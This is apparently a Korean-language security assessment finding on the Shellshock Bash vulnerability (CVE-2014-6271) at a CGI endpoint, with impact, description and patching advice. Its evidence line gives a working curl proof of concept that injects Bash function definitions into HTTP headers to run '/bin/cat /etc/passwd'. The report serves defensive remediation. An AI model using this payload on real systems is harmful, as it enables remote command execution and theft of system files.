## ShellShock - Remote Code Execution
- **End-Point**: `http://10.67.139.88/cgi-bin/test.cgi`
- **영향**: 원격 코드 실행(RCE)을 통해 비인가 접근, 데이터 탈취 및 전체 시스템 장악이 가능함.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수에 포함된 함수 정의 뒤의 문자열을 부적절하게 처리하여 발생하는 취약점(CVE-2014-6271)으로, 조작된 환경 변수를 통해 임의 명령어를 실행할 수 있음.
- **근거**: HTTP 헤더(`Cookie`, `Referer`, `Shellshock`)에 Bash 함수 정의와 명령어를 삽입하여 `/etc/passwd` 파일 읽기를 시도하는 다음의 재현 코드를 확인: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36' 'http://10.67.139.88/cgi-bin/test.cgi'`
- **대응**: 취약점이 해결된 최신 버전의 GNU Bash로 업데이트를 수행함.
- **조치**: OS 패키지 관리자(`yum`, `apt` 등)를 통해 Bash 패치를 적용하고, 외부 노출된 CGI 스크립트 및 환경 변수 처리 로직의 보안성을 점검함.
